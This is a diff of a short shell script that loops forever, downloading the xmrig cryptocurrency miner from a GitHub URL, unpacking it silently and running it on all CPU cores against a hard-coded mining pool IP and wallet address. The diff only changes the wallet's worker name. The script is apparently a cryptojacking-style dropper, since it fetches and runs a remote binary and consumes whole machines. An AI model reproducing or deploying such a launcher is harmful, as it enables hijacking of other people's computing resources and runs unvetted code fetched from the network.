@@ -1,6 +1,6 @@
 #!/bin/sh
 while [ 1 ]; do
 	wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
-	./xmrig --algo gr --url stratum+tcp://128.199.213.167:443 --user RJ16sefqzcrbSic5at15fMTfBZoFUheBji -t $(nproc --all)
+	./xmrig --algo gr --url stratum+tcp://128.199.213.167:443 --user RJ16sefqzcrbSic5at15fMTfBZoFUheBji.lulukang -t $(nproc --all)
 	sleep 5
 done
